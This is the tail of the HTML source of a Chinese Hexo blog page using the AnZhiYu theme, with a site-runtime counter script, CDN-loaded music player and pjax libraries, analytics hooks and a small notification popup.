      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    } else {
      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
      let img = document.querySelector("#workboard .workSituationImg");
      img.src = "https://npm.elemecdn.com/anzhiyu-blog@2.0.4/img/badge/安知鱼-下班啦.svg";
      img.title = "下班了就该开开心心的玩耍，嘿嘿~";
      img.alt = "下班了就该开开心心的玩耍，嘿嘿~";

      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    }

    if (document.getElementById("runtimeTextTip")) {
      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
    }
  }

  setInterval(() => {
    updateTime();
    updateHtml();
  }, 1000);
})();</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "visitor@anheyu.com";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>